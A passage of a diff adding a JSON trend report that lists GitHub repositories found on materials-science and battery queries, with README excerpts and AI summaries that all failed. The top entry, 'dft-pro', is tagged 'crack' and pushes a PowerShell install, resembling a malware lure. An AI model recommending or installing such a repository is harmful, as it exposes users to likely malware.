@@ -1,0 +1,1115 @@
+{
+ "date": "2026-11-23",
+ "tab": "interest",
+ "status": "ok",
+ "compared_with": "2026-11-22",
+ "candidates": 745,
+ "model": "claude-haiku-4-5",
+ "prompt_version": "v2",
+ "category_counts": {
+  "재료 시뮬레이션": 0,
+  "재료 데이터·ML": 0,
+  "이차전지": 0,
+  "분석기기·데이터 처리": 0,
+  "과학계산 일반": 0,
+  "기타": 0
+ },
+ "repos": [
+  {
+   "full_name": "noba12/dft-pro",
+   "url": "https://github.com/noba12/dft-pro",
+   "description": "DFT Pro: Professional Desktop Platform with Integrated Toolset and Full Feature Access",
+   "language": "HTML",
+   "stars": 336,
+   "forks": 0,
+   "topics": [
+    "automation",
+    "desktop",
+    "developer-tools",
+    "dft",
+    "dft-freedft-calculations",
+    "dft-pro",
+    "dft-pro-2026",
+    "dft-pro-crack",
+    "open-source",
+    "python",
+    "scripts",
+    "software-engineering",
+    "system",
+    "utility",
+    "windows-app"
+   ],
+   "pushed_at": "2026-11-22T23:23:29Z",
+   "matched_queries": [
+    "topic:dft"
+   ],
+   "stars_delta": 148,
+   "rank": 1,
+   "readme_excerpt": "# DFT Pro: Advanced Desktop Utility Suite for Windows 11\n\n# 📦 PowerShell Install Button\n\nDFT Pro is a desktop application for Windows x64 that consolidates the full range of DFT tooling into a single, locally executed environment. The build ships as a self-contained package with all required components provisioned in advance, eliminating external dependency resolution and enabling immediate operation in offline or restricted infrastructure. Engineered for deterministic behavior, it provides a stable, reproducible configuration suitable for both validation workflows and production deployment. The application exposes its feature set from first launch, with no additional activation or configuration steps required beyond initial.\n\n# 🔧 Requirements\n\n• Windows 10 or Windows 11\n\n• PowerShell 5.1 or newer (already available on Windows)\n\n• No admin rights needed",
+   "readme_chars": 12535,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 1,
+   "is_new": true
+  },
+  {
+   "full_name": "K-Dense-AI/scientific-agent-skills",
+   "url": "https://github.com/K-Dense-AI/scientific-agent-skills",
+   "description": "Turn any AI agent into an AI Scientist. The #1 Agent Skills library for science, used by 250,000+ scientists worldwide. 177 ready-to-use validated skills plus 100+ scientific databases covering biology, chemistry, medicine, and drug discovery. Compatible with Cursor, Claude Code, Codex, Pi, Antigravity, and the open Agent Skills standard.",
+   "language": "Python",
+   "stars": 58127,
+   "forks": 5091,
+   "topics": [
+    "agent-skills",
+    "ai-scientist",
+    "bioinformatics",
+    "chemoinformatics",
+    "claude",
+    "claude-skills",
+    "claudecode",
+    "clinical-research",
+    "computational-biology",
+    "data-analysis",
+    "drug-discovery",
+    "genomics",
+    "materials-science",
+    "metabolomics",
+    "proteomics",
+    "scientific-computing",
+    "scientific-visualization"
+   ],
+   "pushed_at": "2026-11-16T09:19:25Z",
+   "matched_queries": [
+    "topic:materials-science"
+   ],
+   "stars_delta": 88,
+   "rank": 2,
+   "readme_excerpt": "# Scientific Agent Skills\n\n> 🔔 Claude Scientific Skills is now Scientific Agent Skills. Same skills, broader compatibility — now works with any AI agent that supports the open Agent Skills standard, not just Claude.\n\n> New: K-Dense BYOK — A free, open-source AI co-scientist that runs on your desktop, powered by Scientific Agent Skills. Bring your own API keys, pick from 40+ models, and get a full research workspace with web search, file handling, 100+ scientific databases, and access to all 177 skills in this repo. Your data stays on your computer, and you can optionally scale to cloud compute via Modal for heavy workloads. Get started here.",
+   "readme_chars": 78749,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 25,
+   "is_new": false
+  },
+  {
+   "full_name": "langchain-ai/deepagents",
+   "url": "https://github.com/langchain-ai/deepagents",
+   "description": "The batteries-included agent harness.",
+   "language": "Python",
+   "stars": 31525,
+   "forks": 4462,
+   "topics": [
+    "ai",
+    "deepagents",
+    "harness",
+    "harness-engineering",
+    "langchain",
+    "langgraph",
+    "python",
+    "typescript"
+   ],
+   "pushed_at": "2026-11-23T03:44:17Z",
+   "matched_queries": [
+    "battery in:name,description"
+   ],
+   "stars_delta": 23,
+   "rank": 3,
+   "readme_excerpt": "The batteries-included agent harness.\n\nDeep Agents is an open source agent harness — an opinionated agent that runs out of the box. Extend, override, or replace any piece.\n\n• Opinionated — defaults tuned for long-horizon, multi-step work\n\n• Extensible — override or replace any piece without forking\n\n• Model-agnostic — works with any LLM that supports tool calling: frontier, open-weight, or local\n\n• Production-ready — built on LangGraph (streaming, persistence, checkpointing) with first-class tracing, evaluation, and deployment via LangSmith\n\n• Sub-agents — delegate tasks to agents with isolated context windows\n\n• Filesystem — read, write, edit, or search over pluggable local, sandboxed, or remote backends\n\n• Context management — summarize long threads and offload tool outputs to disk\n\n• Shell access — run commands in your sandbox of choice\n\n• Persistent memory — pluggable state and store backends for cross-session recall",
+   "readme_chars": 6219,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 25,
+   "is_new": false
+  },
+  {
+   "full_name": "lingyired/status-trio",
+   "url": "https://github.com/lingyired/status-trio",
+   "description": "Status Trio — a native macOS app that combines Wi-Fi, battery, and volume into one compact, configurable status icon for the menu bar, the Dock, or both, inspired by the iPhone Duo combined status bar.",
+   "language": "Swift",
+   "stars": 2070,
+   "forks": 113,
+   "topics": [
+    "appkit",
+    "battery",
+    "dock",
+    "duobar",
+    "iphone-duo",
+    "macos",
+    "macos-app",
+    "menu-bar",
+    "menubar",
+    "menubar-app",
+    "status-bar",
+    "statusbar",
+    "swift",
+    "swiftui",
+    "three-in-one",
+    "utility",
+    "volume",
+    "wifi"
+   ],
+   "pushed_at": "2026-11-23T04:00:17Z",
+   "matched_queries": [
+    "topic:battery",
+    "battery in:name,description"
+   ],
+   "stars_delta": 23,
+   "rank": 4,
+   "readme_excerpt": "Three system signals. One native macOS status icon — in your menu bar or the Dock.\n\nWant to see it in action first? Open statustrio.lingai.net to simulate every icon state in your browser.\n\nStatus Trio is a native macOS status app that combines Wi-Fi, battery, and volume into one compact, configurable icon, shown in the menu bar, in the Dock, or in both. Its popover goes deeper than the icon: a Wi-Fi panel for nearby networks and link details, a Bluetooth panel for paired devices, a Battery Details page, and the audio devices that are playing. It is inspired by the iPhone Duo's combined status bar icon for Wi-Fi, Battery, and Cellular Data, adapted for Mac with Volume instead of Cellular Data.\n\n> Status Trio is an independent project and is not affiliated with Apple.\n\n# Highlights\n\n• One icon, three signals — battery, Wi-Fi, and volume share one icon in the menu bar, the Dock, or both, and a Bluetooth device that is playing can take the middle spot with its own symbol.",
+   "readme_chars": 13729,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 25,
+   "is_new": false
+  },
+  {
+   "full_name": "wushuai0802/myfinder-device-battery",
+   "url": "https://github.com/wushuai0802/myfinder-device-battery",
+   "description": "macOS-style mouse and headset battery indicator card for Windows and MyDockFinder (ATK Mouse & HyperX Headset)",
+   "language": "Python",
+   "stars": 447,
+   "forks": 28,
+   "topics": [],
+   "pushed_at": "2026-11-22T23:46:16Z",
+   "matched_queries": [
+    "battery in:name,description"
+   ],
+   "stars_delta": 16,
+   "rank": 5,
+   "readme_excerpt": "# MyFinder Device Battery\n\nWindows 上的多品牌无线鼠标、耳机与键盘电量卡片，支持 MyDockFinder / MyFinder，也可独立作为系统托盘应用使用。\n\n当前源码版本 1.3.11-beta.22（测试版），适用于 Windows 10/11 x64。原生界面使用系统 .NET Framework，发行包内置设备读取组件，无需用户安装Python、厂商驱动或填写VID/PID。公开可下载版本以 Releases 页面为准，旧版本保留在历史Release中。\n\n1.3.11-beta.22 新增 XIBERIA T7、K03S、K06S 和 T10 的 2.4G 电量候选，均为 C 级，待实机验证。程序内反馈与回复优先走 Cloudflare。读取组件在设备空闲且连续读不到电量时延长查询间隔，面板增加可收起的读取故障提示。ATK A9 Air+ 插线充电时的单卡显示待实机确认。\n\n1.3.11-beta.21 新增迈从 X9 耳机（3837:6045）、R9 耳机（3837:6013）和 V7 / G3 V3 共用 1K 接收器（3837:1016）的 2.4G 电量读取候选，三项均为 C 级，待实机验证。本版还收窄了迈从旧协议查询范围，支持在程序运行期间恢复未提交的反馈草稿，并可左键点击托盘图标找回被遮挡的反馈窗口。\n\n1.3.11-beta.20 新增狼蛛 AULA F99 MAX 的 2.4G 电量候选。共享 05AC:024F 接收器只有在产品串、集合、报告长度与自报固件身份均符合时才会读取。一次只发送两包固定设备信息请求，不使用配置、灯光、配对或固件命令。电量有官方驱动与键盘屏显 68% 的一次对照，充电状态、睡眠唤醒及驱动共存仍待本版实机确认。\n\n1.3.11-beta.19 新增 VGN F1 MOBA 有线接口（3554:F506）的只读电量候选。程序仍要求运行时确认 FF02:0002 和目标输出恰为17字节后才查询；目前只有官方 VGN HUB 的静态协议依据，没有该接口的实机回复或厂商界面对照，充电状态也未实机确认，DPI 不在此适配范围。",
+   "readme_chars": 22588,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "README가 중국어 위주",
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 5,
+   "is_new": false
+  },
+  {
+   "full_name": "Universal-Debloater-Alliance/universal-android-debloater-next-generation",
+   "url": "https://github.com/Universal-Debloater-Alliance/universal-android-debloater-next-generation",
+   "description": "Cross-platform GUI written in Rust using ADB to debloat non-rooted Android devices. Improve your privacy, the security and battery life of your device.",
+   "language": "Rust",
+   "stars": 10269,
+   "forks": 453,
+   "topics": [
+    "adb",
+    "android",
+    "bloatware-list",
+    "bloatware-removal",
+    "debloat",
+    "debloater",
+    "debloating",
+    "privacy"
+   ],
+   "pushed_at": "2026-11-21T04:28:25Z",
+   "matched_queries": [
+    "battery in:name,description"
+   ],
+   "stars_delta": 15,
+   "rank": 6,
+   "readme_excerpt": "# Universal Android Debloater Next Generation\n\n> DISCLAIMER: Use at your own risk. We're not responsible for anything that could happen to your devices.\n\nThis is a detached fork of the UAD project. This aims to improve privacy and efficiency (energy, speed, memory) by removing unnecessary and obscure system apps. This can also improve security by reducing the attack surface. Read the wiki for more details.\n\n# Documentation\n\nEverything about UAD-ng (and related stuff) can be found on the Wiki, such as:\n\n• Features of this app\n\n• Suggested Android app replacements\n\n• How to get the cutting-edge version by building the source-code\n\n• Weird things OEMs do\n\n• Suggested apps for analyzing APKs\n\n# Privacy\n\nUAD-ng does not collect or transmit any user data. The only external connections are GET requests to GitHub for fetching the package list (crates/uad-core/src/uad_lists.rs) and checking for updates (crates/uad-core/src/update.rs).",
+   "readme_chars": 3364,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 25,
+   "is_new": false
+  },
+  {
+   "full_name": "zellij-org/zellij",
+   "url": "https://github.com/zellij-org/zellij",
+   "description": "A terminal workspace with batteries included",
+   "language": "Rust",
+   "stars": 36192,
+   "forks": 1555,
+   "topics": [
+    "multiplexer",
+    "terminal",
+    "workspace"
+   ],
+   "pushed_at": "2026-11-22T22:27:57Z",
+   "matched_queries": [
+    "battery in:name,description"
+   ],
+   "stars_delta": 13,
+   "rank": 7,
+   "readme_excerpt": "[ Screencasts & Tutorials ]\n\n# What is this?\n\nZellij is a workspace aimed at developers, ops-oriented people and anyone who loves the terminal. Similar programs are sometimes called \"Terminal Multiplexers\".\n\nZellij is designed around the philosophy that one must not sacrifice simplicity for power, taking pride in its great experience out of the box as well as the advanced features it places at its users' fingertips.\n\nZellij is geared toward beginner and power users alike - allowing deep customizability, personal automation through layouts, true multiplayer collaboration, unique UX features such as floating and stacked panes, and a plugin system allowing one to create plugins in any language that compiles to WebAssembly.\n\nZellij includes a built-in web-client, making a terminal optional.\n\nYou can get started by installing Zellij and checking out the Screencasts & Tutorials.\n\nFor more details about our future plans, read about upcoming features in our roadmap.",
+   "readme_chars": 1966,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 9,
+   "is_new": false
+  },
+  {
+   "full_name": "exelban/stats",
+   "url": "https://github.com/exelban/stats",
+   "description": "macOS system monitor in your menu bar",
+   "language": "Swift",
+   "stars": 43570,
+   "forks": 1645,
+   "topics": [
+    "battery",
+    "bluetooth",
+    "clock",
+    "cpu",
+    "disk",
+    "fans",
+    "gpu",
+    "macos",
+    "menubar",
+    "monitor",
+    "network",
+    "sensors",
+    "stats",
+    "temperature"
+   ],
+   "pushed_at": "2026-11-22T11:18:48Z",
+   "matched_queries": [
+    "topic:battery"
+   ],
+   "stars_delta": 12,
+   "rank": 8,
+   "readme_excerpt": "# Stats\n\nmacOS system monitor in your menu bar\n\n# Installation\n\n# Manual\n\nYou can download the latest version here. This will download a file called Stats.dmg. Open it and move the app to the application folder.\n\n# Homebrew\n\nTo install it using Homebrew, open the Terminal app and type:\n\n# Headless (SSH)\n\nTo install Stats remotely over SSH and set it up as a remote monitoring agent, run:\n\nThe script installs the app, enables the Remote module and prints a URL with an authorization code - open it on any device and sign in to your System Stats account to authorize the machine. After that Stats starts streaming metrics to your account and is registered to launch automatically at login and restart if it stops. The Mac needs an active user session (a locked screen is fine) to run the app; on a fully headless machine Stats will start at the next login.\n\n# Uninstall\n\nRun the uninstall script bundled with the app (requires administrator privileges to remove the SMC helper):",
+   "readme_chars": 11172,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 25,
+   "is_new": false
+  },
+  {
+   "full_name": "msucimaker3112/energy-cockpit",
+   "url": "https://github.com/msucimaker3112/energy-cockpit",
+   "description": "Home-Assistant-Karten (HACS, deutsch): Energiefluss mit mehreren Speichern und zweiter PV-Anlage, Geräte & Verbrauch, Statistik und Raum-Abrechnung. Einrichtungsassistent, Farbschemen, Kurzansicht fürs Handy.",
+   "language": "JavaScript",
+   "stars": 127,
+   "forks": 9,
+   "topics": [
+    "battery",
+    "dashboard",
+    "energy",
+    "energy-monitoring",
+    "hacs",
+    "home-assistant",
+    "lovelace",
+    "lovelace-card",
+    "photovoltaics",
+    "solar"
+   ],
+   "pushed_at": "2026-11-22T16:49:46Z",
+   "matched_queries": [
+    "topic:battery"
+   ],
+   "stars_delta": 11,
+   "rank": 9,
+   "readme_excerpt": "Deine Energie auf einen Blick, auch in 3D. Energiefluss, Geräte, Statistik und Raum-Abrechnung für Home Assistant. Komplett deutsch und kostenlos. Ein Assistent richtet alles ein, du brauchst kein YAML. Neu: Gas und Wasser. Eigene Kacheln für Therme und Wasserzähler, mit Linie zum Haus. Neu: Die Karte erklärt sich selbst. Ein „?“ sagt dir, warum gerade Strom aus dem Netz kommt. Neu: Auch für ioBroker. Als Community-Projekt von Andreas ( Landixus ), mehr dazu unten .\n\nAlle Bilder zeigen Beispieldaten.\n\n🇬🇧 English version below · The cards also speak English and Dutch, set automatically from your Home Assistant language.\n\nGefällt dir die Karte? Ein ⭐ oben rechts hilft mehr, als du denkst. Warum mir das wichtig ist\n\nNeu: Gas und Wasser · Neu: Warum? · Jedes Gerät · Die vier Karten · Installation · ioBroker · 3D-Ansicht · Kosten pro Verbraucher · Wetter, Farben und mehr · Handy und Tablet · Anleitungen · English",
+   "readme_chars": 30245,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 10,
+   "is_new": false
+  },
+  {
+   "full_name": "tokio-rs/topcoat",
+   "url": "https://github.com/tokio-rs/topcoat",
+   "description": "A batteries-included framework for building web apps",
+   "language": "Rust",
+   "stars": 7304,
+   "forks": 308,
+   "topics": [],
+   "pushed_at": "2026-11-14T14:25:29Z",
+   "matched_queries": [
+    "battery in:name,description"
+   ],
+   "stars_delta": 10,
+   "rank": 10,
+   "readme_excerpt": "The full full-stack framework for Rust\n\nTopcoat is a modular, batteries-included Rust framework for building full-stack apps. It prioritizes simplicity and productivity. See Learn Topcoat to get started, or the Roadmap for what's coming next.\n\nEarly-stage and experimental. Expect breaking changes.\n\n# What makes Topcoat different\n\n# Client reactivity without the boilerplate\n\nTopcoat renders all markup on the server: components can be async and query the database directly, eliminating all the traditional boilerplate needed for a separate API layer. Interactivity does not have to cost a round-trip, though. A $(...) expression is ordinary type-checked Rust that Topcoat evaluates on the server for the initial render and also translates to JavaScript, so it re-runs instantly in the browser. No wasm bundle, no client build step:",
+   "readme_chars": 11699,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 25,
+   "is_new": false
+  },
+  {
+   "full_name": "dikeckaan/mu300-linux",
+   "url": "https://github.com/dikeckaan/mu300-linux",
+   "description": "Linux (Ubuntu 24.04/26.04 or OpenWrt) next to Android on the ZTE F50 / MU300 and U30 Air 5G hotspots (Unisoc T760 / UMS9620): installer, vendor 5.4 and mainline 6.18 / 7.2 kernels, 5G modem, Wi-Fi, battery, LEDs, NFC, findings",
+   "language": "C",
+   "stars": 921,
+   "forks": 151,
+   "topics": [
+    "5g",
+    "embedded-linux",
+    "linux",
+    "linux-kernel",
+    "openwrt",
+    "ubuntu",
+    "unisoc",
+    "zte"
+   ],
+   "pushed_at": "2026-11-20T13:53:22Z",
+   "matched_queries": [
+    "battery in:name,description"
+   ],
+   "stars_delta": 8,
+   "rank": 11,
+   "readme_excerpt": "# Linux on the ZTE F50 / MU300 and U30 Air\n\nNews and new releases are announced on the Telegram channel: t.me/mu300project. Follow it to hear\n\nThe ZTE F50 is a pocket 5G router. This project turns it into a small Linux computer: Ubuntu (24.04 or 26.04 LTS) or OpenWrt (plain, or with a control panel for the modem), with SSH, Wi-Fi, Bluetooth and its 5G modem working. Android stays on the device, and you can go back to it at any time.\n\nThink of it as a Raspberry Pi that already has a 5G modem, a Wi-Fi access point and 32 GB of storage inside.\n\nThe ZTE U30 Air is supported too: the same board and chip with a battery. The installer recognises which one it is talking to; see Supported devices.",
+   "readme_chars": 103319,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 1,
+   "is_new": false
+  },
+  {
+   "full_name": "HeyOkay/HaloBattery",
+   "url": "https://github.com/HeyOkay/HaloBattery",
+   "description": "Battery levels in the Windows tray - from mice, keyboards, headsets and controllers to health trackers and smart home devices.",
+   "language": "Python",
+   "stars": 845,
+   "forks": 99,
+   "topics": [
+    "2-4ghz",
+    "battery-monitor",
+    "bluetooth",
+    "charging",
+    "health-trackers",
+    "peripherals",
+    "smart-home",
+    "system-tray",
+    "windows",
+    "wireless"
+   ],
+   "pushed_at": "2026-11-22T12:49:17Z",
+   "matched_queries": [
+    "battery in:name,description"
+   ],
+   "stars_delta": 8,
+   "rank": 12,
+   "readme_excerpt": "# Halo Battery\n\nBattery levels of your wireless mouse, keyboard, headset and controller, right in the Windows tray. One icon per device. No vendor software.\n\n# ⬇ Download the latest version\n\nMaintained together with the community. To help, read Contributing. The pre-release build has fixes that are not released yet. It is rebuilt on every merge and may have bugs.\n\n# Features\n\n• One glance. A ring for each device fills with its level, turns amber near your alert level and red below it, and breathes green while charging.\n\n• No vendor apps. Close Synapse, G HUB, NGENUITY and the rest: Halo Battery talks to the receiver, the cable or Windows Bluetooth itself.\n\n• 30+ brands. Razer, Logitech, SteelSeries, HyperX, Corsair, ASUS ROG, Sony, Xbox, Nintendo, 8BitDo, Pulsar, Keychron and many more.\n\n• Stays out of the way. Alerts wait until your full-screen game closes, and devices are polled less often while you play.",
+   "readme_chars": 4688,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 10,
+   "is_new": false
+  },
+  {
+   "full_name": "DillanCidral/Joule",
+   "url": "https://github.com/DillanCidral/Joule",
+   "description": "Battery for your wireless mouse, headset, controller and keyboard, in the Windows tray. · Bateria do mouse, fone, controle e teclado sem fio, na bandeja do Windows.",
+   "language": "C#",
+   "stars": 151,
+   "forks": 11,
+   "topics": [
+    "battery",
+    "battery-monitor",
+    "bluetooth",
+    "csharp",
+    "dotnet",
+    "gamepad",
+    "headset",
+    "hid",
+    "keyboard",
+    "mouse",
+    "open-source",
+    "peripherals",
+    "system-tray",
+    "windows",
+    "windows-11",
+    "wireless",
+    "wpf"
+   ],
+   "pushed_at": "2026-11-21T23:34:11Z",
+   "matched_queries": [
+    "topic:battery"
+   ],
+   "stars_delta": 7,
+   "rank": 13,
+   "readme_excerpt": "Battery for your wireless mouse, headset, controller and keyboard, in the Windows tray.\n\n> Windows Defender and version 0.2.3. Since November 20, 2026, Defender > flags the installer as Trojan:Win32/Yomal!rfn and quarantines it. The > release files are the same ones published on November 19, and the app rebuilt > from this code matches the released binary. Everything points to a false > alarm, and the file has been sent to Microsoft for review. If Defender caught > Joule, you can leave it in quarantine and wait: this notice will change when > Microsoft replies. Details on the 0.2.3 release page.\n\nJoule is a small Windows 11 app that sits in the tray and shows how much battery your wireless devices have left. It is free, open source and in\n\n# What you get\n\n• Panel: click the tray icon to see every connected device, weakest first.\n\n• Edge widget: battery rings on the edge of the screen. It hides itself and\n\ngets out of the way of full-screen apps.",
+   "readme_chars": 8123,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 2,
+   "is_new": false
+  },
+  {
+   "full_name": "mostlygeek/llama-swap",
+   "url": "https://github.com/mostlygeek/llama-swap",
+   "description": "Reliable model swapping for any local AI server. Chosen by thousands of users.  Batteries included. If we don't have it, you probably don't need it.",
+   "language": "Go",
+   "stars": 6295,
+   "forks": 550,
+   "topics": [
+    "ai",
+    "golang",
+    "llama",
+    "llm",
+    "localllama",
+    "localllm"
+   ],
+   "pushed_at": "2026-11-22T22:11:21Z",
+   "matched_queries": [
+    "battery in:name,description"
+   ],
+   "stars_delta": 6,
+   "rank": 14,
+   "readme_excerpt": "# llama-swap\n\nRun multiple generative AI models on your machine and hot-swap between them on demand. llama-swap works with any OpenAI and Anthropic API compatible server and is used by thousands of people to power their local AI workflows.\n\nBuilt in Go for performance and simplicity, llama-swap has zero dependencies and is incredibly easy to set up. Get started in minutes - just one binary and one configuration file.\n\n> Got questions about configuring llama-swap? Try out the Chat agent on llama-swap.ai. > It runs entirely in your browser and is powered by LFM3-1.7B fine tuned on the docs.\n\n# Features:\n\n• ✅ Easy to deploy and configure: one binary, one configuration file. no external dependencies\n\n• ✅ On-demand model switching for many local AI servers (llama.cpp + forks, vllm, stable-diffusion.cpp, audio.cpp, ComfyUI, etc.)\n\n• future proof, upgrade your inference servers at any time.\n\n• ✅ OpenAI API supported endpoints:\n\n• v1/models - list available models",
+   "readme_chars": 17413,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 3,
+   "is_new": false
+  },
+  {
+   "full_name": "evcc-io/evcc",
+   "url": "https://github.com/evcc-io/evcc",
+   "description": "smart charging ☀️🚘",
+   "language": "Go",
+   "stars": 7653,
+   "forks": 1652,
+   "topics": [
+    "battery",
+    "charger",
+    "eebus",
+    "emobility",
+    "golang",
+    "home-automation",
+    "modbus",
+    "mqtt",
+    "ocpp",
+    "pv",
+    "semp",
+    "solar",
+    "sunspec",
+    "wallbox"
+   ],
+   "pushed_at": "2026-11-23T00:51:33Z",
+   "matched_queries": [
+    "topic:battery"
+   ],
+   "stars_delta": 4,
+   "rank": 15,
+   "readme_excerpt": "# evcc 🚘☀️\n\nevcc is an extensible EV Charge Controller and home energy management system.\n\nOur goal is to provide local energy management, without relying on cloud services. Featured in PV Magazine and c’t Magazin.\n\n# Features\n\n• simple and clean user interface\n\n• support for many EV chargers:",
+   "readme_chars": 7528,
+   "ai": {
+    "category": "기타",
+    "summary_ko": "",
+    "description_ko": "",
+    "confidence": "low",
+    "confidence_reason": "AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions",
+    "relevant": false,
+    "relevance_reason": "AI 처리 실패",
+    "category_reason": "",
+    "llm_issues": []
+   },
+   "warnings": [
+    "AI 확신 낮음: AI 처리 실패: Error code: 404 - 지원하지 않는 경로입니다: POST /chat/completions"
+   ],
+   "streak": 6,
+   "is_new": false
+  },
+  {
+   "full_name": "johnfanv2/LenovoLegionLinux",
+   "url": "https://github.com/johnfanv2/LenovoLegionLinux",
+   "description": "Driver and tools for controlling Lenovo Legion laptops in Linux including fan control and power mode.",
+   "language": "C",
+   "stars": 3579,
+   "forks": 159,
+   "topics": [
+    "arch-linux",
+    "archlinux",
+    "battery",
+    "charging",
+    "conservation-mode",
+    "debian",
+    "fan-control",
+    "gaming",
+    "gentoo",
+    "laptop",
+    "legion",
+    "lenovo",
+    "lenovo-ideapad",
+    "lenovo-legion",
+    "lenovo-vantage",
+    "linux",
+    "linux-driver",
+    "powermode",
+    "ubuntu",
+    "utility"
+   ],
